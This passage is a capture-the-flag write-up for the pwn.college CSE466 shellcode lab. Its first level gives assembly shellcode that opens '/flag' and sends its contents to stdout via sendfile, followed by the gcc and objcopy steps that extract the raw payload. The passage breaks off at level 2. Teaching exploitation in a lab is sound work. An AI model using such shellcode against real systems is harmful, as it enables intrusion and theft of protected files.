# pwn.college
## CSE466
### Shell
#### 1

We are asked to receive the flag in '/flag'. First, we write the assembly code corresponding to the shellcode that we want to generate:

```asm
.global _start


_start:
  movq $2, %rax  # open()
  leaq flag(%rip), %rdi # RIP relative addressing
  movq $0, %rsi
  movq $0, %rdx
  syscall
  
  movq %rax, %rsi
  movq $40, %rax # syscall sendfile
  movq $1, %rdi
  movq $0, %rdx
  movq $1000, %r10
  syscall

flag: .asciz "/flag"
```

Than, we need to compile it and dump its `.text` section with `objcopy`:

```
gcc -no-pie -nostdlib -o 1 1.s
objcopy -O binary --only-section=.text 1 1.raw
```

Now, all we need to do is provide this 1.raw as input to the binary and we get the flag!

#### 2
Our solutio